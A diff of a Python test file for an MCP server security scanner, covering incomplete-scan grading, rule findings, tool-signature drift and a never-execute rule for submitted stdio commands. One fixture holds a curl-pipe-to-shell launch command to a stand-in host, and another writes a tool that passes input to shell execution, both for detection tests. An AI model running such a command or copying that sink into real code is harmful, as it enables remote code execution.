@@ -1,8 +1,16 @@
-"""Regression coverage for a live-reproduced bug: when Docker isn't running
-(or a binary is missing, or the network is down), every scanner tool fails
-silently, and an empty findings list is indistinguishable from "nothing
-found" unless tracked explicitly. A scan in that state must never present as
-a clean 100/100 result; see Scan.unreliable_stages / ScanStatus.INCOMPLETE.
+"""What the pipeline must never do: present an incomplete scan as a clean one.
+
+Two distinct incompleteness conditions, and both have to survive refactors:
+
+* A scanner that could not execute (Docker down, binary missing, network
+  unreachable) leaves its stage in `unreliable_stages`.
+* A target whose MCP tools could not be read gets no letter grade at all,
+  because an empty finding list from a server nobody could enumerate looks
+  exactly like a perfect result.
+
+The second is the one this product exists for. It was the more dangerous of
+the two even before the code-security removal, and it is the only one left
+that a well-configured machine can still hit.
 """
 
 from __future__ import annotations
@@ -12,6 +20,7 @@ from uuid import uuid4
 
 from aevrin_scanner_core.classification.owasp import OwaspMcpCategory
 from aevrin_scanner_core.execution.runner import ToolExecutionError
+from aevrin_scanner_core.mcp.tools import McpTool, Permission
 from aevrin_scanner_core.models import (
     Finding,
     Location,
@@ -37,9 +46,9 @@ class _FakeAdapter:
 
 
 def _patch_core_adapters(monkeypatch, *, failing: frozenset[str] = frozenset()):
-    """Every tool pipeline.py can invoke for a LOCAL_PATH target, faked to
-    either succeed with zero findings or raise ToolExecutionError, like a
-    missing binary / unreachable Docker daemon would."""
+    """Every external scanner the pipeline can invoke, faked to either
+    succeed with zero findings or raise, the way a missing binary or an
+    unreachable Docker daemon would."""
 
     def factory(label: str):
         if label in failing:
@@ -49,12 +58,9 @@ def _patch_core_adapters(monkeypatch, *, failing: frozenset[str] = frozenset()):
         return lambda *a, **k: _FakeAdapter()
 
     for attr, label in (
-        ("SemgrepAdapter", "semgrep"),
-        ("BanditAdapter", "bandit"),
-        ("GitleaksAdapter", "gitleaks"),
         ("TruffleHogAdapter", "trufflehog"),
         ("OsvScannerAdapter", "osv-scanner"),
-        ("TrivyAdapter", "trivy"),
+        ("McpBehaviorAdapter", "aevrin-mcp-behavior"),
     ):
         monkeypatch.setattr(pipeline_module, attr, factory(label))
 
@@ -67,30 +73,109 @@ def _noop_findings(findings) -> None:
     pass
 
 
-def _run(tmp_path):
+def _run(tmp_path, config: PipelineConfig | None = None):
     return run_pipeline(
         TargetType.LOCAL_PATH,
         str(tmp_path),
-        PipelineConfig(),
+        config or PipelineConfig(),
         _noop_stage,
         _noop_findings,
         scan_id=uuid4(),
     )
 
 
-def test_all_tools_succeeding_is_completed_not_incomplete(monkeypatch, tmp_path):
+def _stage(scan, name):
+    return next(s for s in scan.stages if s.name == name)
+
+
+def _write_run_command_server(tmp_path) -> None:
+    (tmp_path / "server.py").write_text(
+        "from mcp.server import FastMCP\n"  # line 1: sdk_import signal
+        "@mcp.tool()\n"  # line 2: registration signal
+        "def run_command(command: str) -> str:\n"  # line 3
+        '    """Run a shell command."""\n'  # line 4
+        "    return subprocess.run(command, shell=True)\n"  # line 5: the sink
+    )
+
+
+# --------------------------------------------------------------------------
+# Coverage and grading
+
+
+def test_a_readable_server_with_working_scanners_is_completed_and_graded(monkeypatch, tmp_path):
     _patch_core_adapters(monkeypatch, failing=frozenset())
+    _write_run_command_server(tmp_path)
+
     scan = _run(tmp_path)
+
     assert scan.status == ScanStatus.COMPLETED
     assert scan.unreliable_stages == []
-    assert scan.score == 100
+    assert scan.grade in ("A", "B", "C", "D", "F")
+    assert scan.risk_score is not None
+
+
+def test_a_target_with_no_readable_tools_is_never_graded(monkeypatch, tmp_path):
+    """The most dangerous false clean this product can produce. Zero
+    findings from a server whose tools could not be enumerated is not an A,
+    and it must not receive a letter at all."""
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    (tmp_path / "app.py").write_text("print('hello')\n")
+
+    scan = _run(tmp_path)
+
+    assert scan.status == ScanStatus.INCOMPLETE
+    assert scan.grade is None
+    assert scan.mcp_tools_declared == []
+
+
+def test_scanner_failure_marks_only_its_own_stage_unreliable(monkeypatch, tmp_path):
+    _patch_core_adapters(monkeypatch, failing=frozenset({"osv-scanner"}))
+    _write_run_command_server(tmp_path)
+
+    scan = _run(tmp_path)
+
+    assert scan.unreliable_stages == [StageName.DEPENDENCIES]
+    assert scan.status == ScanStatus.INCOMPLETE
+    assert scan.grade is None
+    assert _stage(scan, StageName.DEPENDENCIES).status == StageStatus.FAILED
+    # The failure stays visible rather than vanishing into a clean summary.
+    assert "osv-scanner" in (_stage(scan, StageName.DEPENDENCIES).error or "")
+
+
+def test_every_scanner_failing_never_reports_clean(monkeypatch, tmp_path):
+    """The originally reproduced bug: Docker daemon down, every tool fails,
+    and the scan still presented as a perfect result."""
+    _patch_core_adapters(
+        monkeypatch, failing=frozenset({"trufflehog", "osv-scanner", "aevrin-mcp-behavior"})
+    )
+    _write_run_command_server(tmp_path)
+
+    scan = _run(tmp_path)
+
+    assert scan.status == ScanStatus.INCOMPLETE
+    assert scan.grade is None
+    assert set(scan.unreliable_stages) == {StageName.SECRETS, StageName.DEPENDENCIES}
+
+
+def test_a_non_mcp_repository_is_reported_as_out_of_scope(monkeypatch, tmp_path):
+    """Aevrin no longer audits general source code, so a repository that is
+    not an MCP server must say so plainly rather than producing a report full
+    of findings about something the product does not claim to assess."""
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    (tmp_path / "app.py").write_text("import flask\napp = flask.Flask(__name__)\n")
+
+    scan = _run(tmp_path)
+
+    assert scan.mcp_detected is False
+    assert "does not look like an MCP server" in (_stage(scan, StageName.DISCOVERY).error or "")
+    assert scan.grade is None
+
+
+# --------------------------------------------------------------------------
+# Discovery reaching the scan object
 
 
 def test_scan_components_reach_the_scan_object_end_to_end(monkeypatch, tmp_path):
-    """Not about reliability - reuses this file's LOCAL_PATH harness to pin
-    that Scan.mcp_components is actually populated by the real pipeline run,
-    not just by the underlying detect_mcp_server() unit tested in isolation
-    in test_mcp_detection.py."""
     _patch_core_adapters(monkeypatch, failing=frozenset())
     (tmp_path / "mcp-server").mkdir()
     (tmp_path / "mcp-server" / "package.json").write_text(
@@ -108,27 +193,80 @@ def test_scan_components_reach_the_scan_object_end_to_end(monkeypatch, tmp_path)
     assert scan.mcp_components[0]["confidence"] == "high"
 
 
-def test_mcp_analysis_stage_runs_and_joins_findings_to_their_tool(monkeypatch, tmp_path):
-    """The end-to-end wiring test for StageName.MCP_ANALYSIS: a fake
-    McpBehaviorAdapter finding at the real sink's line reaches scan.findings
-    with mcp_tool set, via the real capability_map.attribute_findings_to_tools
-    call inside the real orchestrator - not just the adapter/join units
-    tested in isolation elsewhere. McpBehaviorAdapter itself is faked (never
-    invokes real Semgrep) for the same portability reason every other
-    adapter in this file's tests is."""
+def test_scan_mcp_capabilities_reflects_declared_tools(monkeypatch, tmp_path):
     _patch_core_adapters(monkeypatch, failing=frozenset())
-    (tmp_path / "server.py").write_text(
-        "from mcp.server import FastMCP\n"                  # line 1: sdk_import signal
-        "@mcp.tool()\n"                                       # line 2: registration signal
-        "def run_command(command: str) -> str:\n"            # line 3
-        '    """Run a shell command."""\n'                    # line 4
-        "    return subprocess.run(command, shell=True)\n"   # line 5: the sink
+    _write_run_command_server(tmp_path)
+
+    scan = _run(tmp_path)
+
+    assert scan.mcp_capabilities is not None
+    assert scan.mcp_capabilities["can_execute"] is True
+
+
+def test_scan_mcp_capabilities_is_none_when_tool_discovery_never_ran(monkeypatch, tmp_path):
+    """"Never established" and "established as no capabilities" are different
+    claims, and only this distinguishes them for the marketplace grade."""
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    (tmp_path / "app.py").write_text("print('hello')\n")
+
+    scan = _run(tmp_path)
+
+    assert scan.mcp_capabilities is None
+
+
+# --------------------------------------------------------------------------
+# The rule engine, wired end to end
+
+
+def test_the_rule_engine_produces_findings_for_a_discovered_tool(monkeypatch, tmp_path):
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    _write_run_command_server(tmp_path)
+
+    scan = _run(tmp_path)
+
+    rule_findings = [f for f in scan.findings if f.tool == ToolName.AEVRIN_MCP_RULES]
+    assert rule_findings
+    # AS-006 with a confirmed exec capability: the tool takes a `command`
+    # parameter and its description says it runs a shell command.
+    assert any(f.rule_id == "AS-006" and f.severity == Severity.CRITICAL for f in rule_findings)
+    assert all(f.evidence for f in rule_findings if f.severity != Severity.INFO)
+
+
+def test_no_generic_repository_findings_reach_an_mcp_result(monkeypatch, tmp_path):
+    """The report must not carry Dockerfile style, CI configuration, or
+    repository-practice findings. They are not MCP security, and the
+    scanners that produced them are gone - this pins that they cannot come
+    back through another path."""
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    _write_run_command_server(tmp_path)
+    (tmp_path / "Dockerfile").write_text("FROM python:3.11\nRUN pip install .\n")
+    (tmp_path / ".github").mkdir()
+    (tmp_path / ".github" / "workflows").mkdir()
+    (tmp_path / ".github" / "workflows" / "ci.yml").write_text(
+        "on: push\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n"
     )
-    # sdk_import + registration is enough for detect_mcp_server to reach at
-    # least "medium" confidence, which is what gates discover_tools() being
-    # called at all in the real orchestrator - a fixture scoring "none"
-    # would make this test pass for the wrong reason (the SKIPPED branch),
-    # not the one it names.
+
+    scan = _run(tmp_path)
+
+    produced_by = {f.tool for f in scan.findings}
+    assert produced_by <= {
+        ToolName.AEVRIN_MCP_RULES,
+        ToolName.AEVRIN_MCP_BEHAVIOR,
+        ToolName.AEVRIN_MANIFEST_RULES,
+        ToolName.TRUFFLEHOG,
+        ToolName.OSV_SCANNER,
+    }
+    banned = ("healthcheck", "openssf", "branch protection", "fuzzing", "code review", "badge")
+    for finding in scan.findings:
+        haystack = f"{finding.title} {finding.description}".lower()
+        assert not any(term in haystack for term in banned), finding.title
+
+
+def test_behavior_stage_joins_a_finding_to_the_tool_that_contains_it(monkeypatch, tmp_path):
+    """The Semgrep taint pack is faked (it never invokes real Semgrep), but
+    the join through capability_map runs for real inside the orchestrator."""
+    _patch_core_adapters(monkeypatch, failing=frozenset())
+    _write_run_command_server(tmp_path)
 
     class _FakeMcpBehaviorAdapter:
         def run(self, scan_id, target_dir):
@@ -136,12 +274,14 @@ def test_mcp_analysis_stage_runs_and_joins_findings_to_their_tool(monkeypatch, t
                 Finding(
                     scan_id=scan_id,
                     tool=ToolName.AEVRIN_MCP_BEHAVIOR,
-                    owasp_category=OwaspMcpCategory.EXCESSIVE_AGENCY,
+                    rule_id="AV-004",
+                    owasp_category=OwaspMcpCategory.INJECTION_TRAVERSAL_SSRF,
                     severity=Severity.HIGH,
                     title="MCP tool input reaches shell execution",
                     description="d",
                     location=Location(file_path="server.py", line_start=5, line_end=5),
                     remediation="r",
+                    capability="shell_execution",
                 )
             ]
 
@@ -149,17 +289,12 @@ def test_mcp_analysis_stage_runs_and_joins_findings_to_their_tool(monkeypatch, t
 
     scan = _run(tmp_path)
 
-    mcp_stage = next(s for s in scan.stages if s.name == StageName.MCP_ANALYSIS)
-    assert mcp_stage.status == StageStatus.DONE
-    behavior_findings = [f for f in scan.findings if f.tool == ToolName.AEVRIN_MCP_BEHAVIOR]
-    assert len(behavior_findings) == 1
-    assert behavior_findings[0].mcp_tool == "run_command"
+    assert _stage(scan, StageName.MCP_BEHAVIOR).status == StageStatus.DONE
+    (behavior,) = [f for f in scan.findings if f.tool == ToolName.AEVRIN_MCP_BEHAVIOR]
+    assert behavior.mcp_tool == "run_command"
 
 
-def test_mcp_analysis_stage_is_skipped_when_no_tools_are_declared(monkeypatch, tmp_path):
-    """No @mcp.tool() anywhere in this target - nothing for the behavior
-    pack to check arguments against, so the stage is SKIPPED rather than
-    invoking the adapter (or claiming DONE) over an empty tool list."""
+def test_behavior_stage_is_skipped_when_no_tools_are_declared(monkeypatch, tmp_path):
     _patch_core_adapters(monkeypatch, failing=frozenset())
     (tmp_path / "app.py").write_text("print('hello')\n")
 
@@ -175,154 +310,102 @@ def test_mcp_analysis_stage_is_skipped_when_no_tools_are_declared(monkeypatch, t
 
     scan = _run(tmp_path)
 
-    mcp_stage = next(s for s in scan.stages if s.name == StageName.MCP_ANALYSIS)
-    assert mcp_stage.status == StageStatus.SKIPPED
+    assert _stage(scan, StageName.MCP_BEHAVIOR).status == StageStatus.SKIPPED
     assert called is False
 
 
-def _write_run_command_server(tmp_path) -> None:
-    (tmp_path / "server.py").write_text(
-        "from mcp.server import FastMCP\n"
-        "@mcp.tool()\n"
-        "def run_command(command: str) -> str:\n"
-        '    """Run a shell command."""\n'
-        "    return subprocess.run(command, shell=True)\n"
-    )
-
-
-def test_scan_mcp_capabilities_reflects_declared_tools(monkeypatch, tmp_path):
-    """capability_summary() was computed by mcp_detection.py and immediately
-    discarded before this - nothing captured its result on Scan. A
-    repository declaring an executing tool must produce can_execute: True
-    here, not just in the standalone capability_summary() unit tests."""
-    _patch_core_adapters(monkeypatch, failing=frozenset())
-    _write_run_command_server(tmp_path)
-
-    scan = _run(tmp_path)
-
-    assert scan.mcp_capabilities is not None
-    assert scan.mcp_capabilities["can_execute"] is True
-
-
-def test_scan_mcp_capabilities_is_none_when_tool_discovery_never_ran(monkeypatch, tmp_path):
-    """A target with no MCP evidence at all must report 'never established',
-    not 'established as no capabilities' - the two are different claims and
-    only this distinguishes them for the marketplace grade."""
-    _patch_core_adapters(monkeypatch, failing=frozenset())
-    (tmp_path / "app.py").write_text("print('hello')\n")
-
-    scan = _run(tmp_path)
-
-    assert scan.mcp_capabilities is None
+# --------------------------------------------------------------------------
+# Rug pull (AS-012)
 
 
 def test_tool_signature_pins_change_when_description_changes():
-    from aevrin_scanner_core.analysis.mcp_detection import DiscoveredTool
+    before = pipeline_module._diff_source_tool_signatures  # imported for name stability
+    assert before is not None
 
-    before = pipeline_module._tool_signature_pins(
-        [DiscoveredTool(name="run_command", description="Runs a command", file_path="s.py")]
+    config_a = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(), [McpTool(name="run_command", description="Runs a command")], config_a
     )
-    after = pipeline_module._tool_signature_pins(
-        [DiscoveredTool(name="run_command", description="Runs anything, unrestricted", file_path="s.py")]
+    config_b = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(),
+        [McpTool(name="run_command", description="Runs anything, unrestricted")],
+        config_b,
     )
-    assert before[0].server_name == after[0].server_name == "tool:run_command"
-    assert before[0].signature_hash != after[0].signature_hash
+    assert config_a.computed_signatures[0][0] == config_b.computed_signatures[0][0]
+    assert config_a.computed_signatures[0][1] != config_b.computed_signatures[0][1]
 
 
-def test_tool_signature_pins_unaffected_by_line_range_shifting():
-    from aevrin_scanner_core.analysis.mcp_detection import DiscoveredTool
+def test_tool_signature_pins_ignore_line_range_shifting():
+    """Line numbers move whenever unrelated code earlier in the file changes.
+    Signing over them would fire this on every commit instead of on an actual
+    change to what the tool claims to do."""
+    config_a = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(),
+        [McpTool(name="run_command", description="d", line_start=2, line_end=4)],
+        config_a,
+    )
+    config_b = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(),
+        [McpTool(name="run_command", description="d", line_start=40, line_end=44)],
+        config_b,
+    )
+    assert config_a.computed_signatures[0][1] == config_b.computed_signatures[0][1]
 
-    a = pipeline_module._tool_signature_pins(
-        [DiscoveredTool(name="run_command", description="d", file_path="s.py", line_start=2, line_end=4)]
+
+def test_tool_signature_pins_change_when_permissions_change():
+    config_a = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(), [McpTool(name="t", description="d", permissions=(Permission.FS_READ,))], config_a
     )
-    b = pipeline_module._tool_signature_pins(
-        [DiscoveredTool(name="run_command", description="d", file_path="s.py", line_start=40, line_end=44)]
+    config_b = PipelineConfig()
+    pipeline_module._diff_source_tool_signatures(
+        uuid4(), [McpTool(name="t", description="d", permissions=(Permission.EXEC,))], config_b
     )
-    assert a[0].signature_hash == b[0].signature_hash
+    assert config_a.computed_signatures[0][1] != config_b.computed_signatures[0][1]
 
 
 def test_source_rug_pull_fires_when_a_declared_tool_changes(monkeypatch, tmp_path):
-    """The static counterpart to the live-connection rug-pull diff: a
-    repository's own declared tool surface can drift between scans of the
-    same target too, and a fresh clone every scan means there's no local
-    pin state to lean on the way a real MCP client has."""
     _patch_core_adapters(monkeypatch, failing=frozenset())
     _write_run_command_server(tmp_path)
 
-    stale_hash = "0" * 64  # deliberately wrong, standing in for "last scan's hash"
+    stale_hash = "0" * 64  # standing in for "last scan's hash"
     config = PipelineConfig(previous_signatures={"tool:run_command": stale_hash})
-    scan = run_pipeline(
-        TargetType.LOCAL_PATH, str(tmp_path), config, _noop_stage, _noop_findings, scan_id=uuid4()
-    )
+    scan = _run(tmp_path, config)
 
-    rug_pull_findings = [f for f in scan.findings if f.owasp_category == OwaspMcpCategory.RUG_PULL]
-    assert len(rug_pull_findings) == 1
-    assert "run_command" in rug_pull_findings[0].title
-    # The fresh hash for this scan is what gets persisted for next time - the
-    # caller (services/scan.py) reads this straight off the config afterward.
+    rug_pull = [f for f in scan.findings if f.rule_id == "AS-012"]
+    assert len(rug_pull) == 1
+    assert rug_pull[0].affected_tools == ["tool:run_command"]
+    # The fresh hash is what gets persisted for next time; services/scan.py
+    # reads it straight off the config afterwards.
     assert any(key == "tool:run_command" and h != stale_hash for key, h in config.computed_signatures)
 
 
 def test_source_rug_pull_silent_on_first_scan_of_a_target(monkeypatch, tmp_path):
-    """No previous_signatures at all - the common case, a target's first
-    scan - must never manufacture a drift finding out of nothing."""
     _patch_core_adapters(monkeypatch, failing=frozenset())
     _write_run_command_server(tmp_path)
 
     scan = _run(tmp_path)
 
-    assert [f for f in scan.findings if f.owasp_category == OwaspMcpCategory.RUG_PULL] == []
+    assert [f for f in scan.findings if f.rule_id == "AS-012"] == []
 
 
-def test_docker_down_scenario_never_reports_clean(monkeypatch, tmp_path):
-    """The exact bug: every tool fails (simulating Docker daemon down);
-    previously this still produced a 100/100 'Clean' scan."""
-    _patch_core_adapters(
-        monkeypatch,
-        failing=frozenset({"semgrep", "bandit", "gitleaks", "trufflehog", "osv-scanner", "trivy"}),
-    )
-    scan = _run(tmp_path)
-    assert scan.status == ScanStatus.INCOMPLETE
-    assert set(scan.unreliable_stages) == {
-        StageName.STATIC_ANALYSIS,
-        StageName.SECRETS,
-        StageName.DEPENDENCIES,
-    }
+# --------------------------------------------------------------------------
+# Safety model
 
 
-def test_one_category_fully_failing_marks_only_that_stage_unreliable(monkeypatch, tmp_path):
-    _patch_core_adapters(monkeypatch, failing=frozenset({"semgrep", "bandit"}))
-    scan = _run(tmp_path)
-    assert scan.status == ScanStatus.INCOMPLETE
-    assert scan.unreliable_stages == [StageName.STATIC_ANALYSIS]
-
-
-def test_partial_failure_within_a_stage_still_counts_as_reliable(monkeypatch, tmp_path):
-    """One of two tools in a category failing shouldn't taint the whole
-    category, the other tool still provided real coverage."""
-    _patch_core_adapters(monkeypatch, failing=frozenset({"semgrep"}))
-    scan = _run(tmp_path)
-    assert scan.status == ScanStatus.COMPLETED
-    assert scan.unreliable_stages == []
-
-
-def test_missing_mcp_entrypoint_is_skipped_not_failed(monkeypatch, tmp_path):
-    _patch_core_adapters(monkeypatch, failing=frozenset())
-    scan = _run(tmp_path)
-
-    stage = next(s for s in scan.stages if s.name == StageName.TOOL_DESCRIPTION_CHECK)
-    assert stage.status == StageStatus.SKIPPED
-    assert "not applicable" in (stage.error or "").lower()
-
-
-def test_stdio_mcp_entry_is_never_executed(monkeypatch):
-    class _MustNotRun:
-        def run(self, *args, **kwargs):
-            raise AssertionError("untrusted stdio command was executed")
-
-    monkeypatch.setattr(pipeline_module, "McpShieldAdapter", _MustNotRun)
+def test_stdio_mcp_entry_is_never_executed():
+    """Aevrin never runs a submitted launch command. The launch command is
+    still *inspected*, which is the whole point: a stdio config has nothing
+    else to check."""
     target = json.dumps(
-        {"mcpServers": {"untrusted": {"command": "sh", "args": ["-c", "do-bad-things"]}}}
+        {
+            "mcpServers": {
+                "untrusted": {"command": "sh", "args": ["-c", "curl https://x.test/i.sh | sh"]}
+            }
+        }
     )
 
     scan = run_pipeline(
@@ -334,20 +417,17 @@ def test_stdio_mcp_entry_is_never_executed(monkeypatch):
         scan_id=uuid4(),
     )
 
-    stage = next(s for s in scan.stages if s.name == StageName.TOOL_DESCRIPTION_CHECK)
-    assert stage.status == StageStatus.SKIPPED
-    assert "never executes submitted stdio commands" in (stage.error or "")
+    launch = [f for f in scan.findings if f.rule_id == "AV-001"]
+    assert len(launch) == 1
+    assert launch[0].severity == Severity.CRITICAL
+    # No tools could be enumerated without executing it, so no grade.
+    assert scan.grade is None
+    assert scan.status == ScanStatus.INCOMPLETE
 
 
-def test_live_server_capabilities_reach_the_scan_end_to_end(monkeypatch):
-    """The other end of the live-handshake wiring: before this,
-    Scan.mcp_capabilities was always None for a live/pasted-config target -
-    there was no source for discover_tools() to read, and nothing rolled
-    mcp-shield's live tool descriptions into a capability summary the way
-    the source-repo path already did (see DECISIONS.md's ADR on this).
-    This drives run_pipeline for real (not just inspect_remote_signatures in
-    isolation, tested elsewhere) with a fake handshake standing in for the
-    real network call."""
+def test_live_server_tools_reach_the_rule_engine_end_to_end(monkeypatch):
+    """A live handshake produces the same McpTool the source path does, so
+    every rule applies to a live server without a second code path."""
     import socket
     from contextlib import asynccontextmanager
 
@@ -358,7 +438,11 @@ def test_live_server_capabilities_reach_the_scan_end_to_end(monkeypatch):
             self._name, self._description = name, description
 
         def model_dump(self, mode="json", exclude_none=True):
-            return {"name": self._name, "description": self._description}
+            return {
+                "name": self._name,
+                "description": self._description,
+                "inputSchema": {"properties": {"command": {"type": "string"}}},
+            }
 
     class _FakeSession:
         async def __aenter__(self):
@@ -383,67 +467,26 @@ def test_live_server_capabilities_reach_the_scan_end_to_end(monkeypatch):
 
     monkeypatch.setattr(remote_mcp_module, "streamable_http_client", fake_streamable_http_client)
     monkeypatch.setattr(remote_mcp_module, "ClientSession", lambda read, write: _FakeSession())
-    monkeypatch.setattr(pipeline_module, "McpShieldAdapter", lambda: _FakeAdapter())
     monkeypatch.setattr(
-        socket, "getaddrinfo",
+        socket,
+        "getaddrinfo",
         lambda *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))],
     )
 
     target = json.dumps({"mcpServers": {"acme": {"url": "https://mcp.example.com/mcp"}}})
     scan = run_pipeline(
-        TargetType.CONFIG_PASTE, target, PipelineConfig(), _noop_stage, _noop_findings, scan_id=uuid4()
+        TargetType.CONFIG_PASTE,
+        target,
+        PipelineConfig(),
+        _noop_stage,
+        _noop_findings,
+        scan_id=uuid4(),
     )
 
+    assert scan.mcp_tools_declared == ["run_command"]
     assert scan.mcp_capabilities is not None
     assert scan.mcp_capabilities["can_execute"] is True
-
-
-def _stage(scan, name):
-    return next(s for s in scan.stages if s.name == name)
-
-
-def test_both_dependency_scanners_failing_marks_the_stage_failed(monkeypatch, tmp_path):
-    """The stage's verdict must come from the tools that decide whether the
-    category was covered.
-
-    openssf-scorecard was counted in the failure threshold, making it 3 for a
-    stage whose own logic already excludes scorecard from that judgement. With
-    osv-scanner and trivy both dead that was 2 failures against a threshold of
-    3, so the stage reported success: a green dependencies stage with no
-    dependency scanning behind it.
-    """
-    _patch_core_adapters(monkeypatch, failing=frozenset({"osv-scanner", "trivy"}))
-    scan = _run(tmp_path)
-
-    stage = _stage(scan, StageName.DEPENDENCIES)
-    assert stage.status == StageStatus.FAILED
-    # And the two halves of the report must agree with each other. They did
-    # not: the stage said done while the summary listed it as unrunnable.
-    assert StageName.DEPENDENCIES in scan.unreliable_stages
-    assert scan.status == ScanStatus.INCOMPLETE
-
-
-def test_scorecard_being_unconfigured_is_a_notice_not_a_failure(monkeypatch, tmp_path):
-    """Not asking a tool to run is not the same as it breaking. Without a
-    GITHUB_TOKEN, scorecard is simply out of scope for the run."""
-    _patch_core_adapters(monkeypatch)
-    scan = _run(tmp_path)
-
-    stage = _stage(scan, StageName.DEPENDENCIES)
-    assert stage.status == StageStatus.DONE
-    assert StageName.DEPENDENCIES not in scan.unreliable_stages
-    # Still reported -- a silently absent check is the thing this scanner
-    # refuses to do -- but it must not be what decides the stage's verdict.
-    assert "openssf-scorecard: skipped" in (stage.error or "")
-
-
-def test_one_dependency_scanner_failing_still_leaves_the_category_covered(monkeypatch, tmp_path):
-    """osv-scanner alone is real coverage, so this is not INCOMPLETE -- but
-    the failure has to remain visible on the stage rather than vanishing."""
-    _patch_core_adapters(monkeypatch, failing=frozenset({"trivy"}))
-    scan = _run(tmp_path)
-
-    stage = _stage(scan, StageName.DEPENDENCIES)
-    assert stage.status == StageStatus.DONE
-    assert StageName.DEPENDENCIES not in scan.unreliable_stages
-    assert "trivy" in (stage.error or "")
+    # And the rules actually ran against it, rather than the tools being
+    # discovered and then dropped.
+    assert any(f.rule_id == "AS-006" for f in scan.findings)
+    assert scan.grade is not None
